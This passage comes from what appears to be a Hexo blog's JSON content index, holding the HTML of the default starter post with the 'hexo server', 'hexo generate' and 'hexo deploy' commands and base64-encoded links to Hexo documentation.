bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}